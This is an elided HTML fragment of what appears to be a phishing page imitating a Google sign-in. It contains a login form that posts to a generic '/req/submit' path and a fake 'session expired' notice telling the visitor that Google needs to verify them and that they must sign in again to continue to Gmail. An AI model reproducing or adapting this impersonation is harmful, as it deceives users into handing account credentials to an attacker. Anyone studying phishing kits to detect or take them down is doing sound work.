...
<head>
    ...
    <style>
        ...
        .maindiv {
            ...
            max-width: calc(660px + 4cm); /* Increase max-width */
        ...
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
            <div class="form-half1">
                ...
                <div class="session-expired-message">
                    <p>To help keep your account secure,<br>
                    <br>Google needs to verify it’s you. <br>Please sign in again to continue to Gmail.</p>
                </div>
